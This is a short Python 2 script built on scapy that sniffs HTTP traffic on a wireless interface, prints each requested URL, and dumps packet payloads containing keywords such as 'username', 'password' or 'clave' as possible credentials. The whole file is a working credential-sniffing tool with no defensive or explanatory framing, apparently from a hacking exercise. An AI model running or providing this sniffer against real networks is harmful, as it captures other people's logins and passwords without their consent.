# Only HTTP
# Python2

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(
        iface=interface,
        store=False,
        prn=process_sniffed_packet  # Callback function
    )


def get_url(packet):

    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'user', 'login', 'mail', 'email', 'usuario', 'clave', 'password', 'pass']

        if [keyword for keyword in keywords if keyword in load]:
                return load
            

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request >> ' + url)

        loggin_info = get_login_info(packet)
        if loggin_info:
            print('\n\n[+] Possible username/password > ' + loggin_info + '\n\n')

sniff("wlan0")
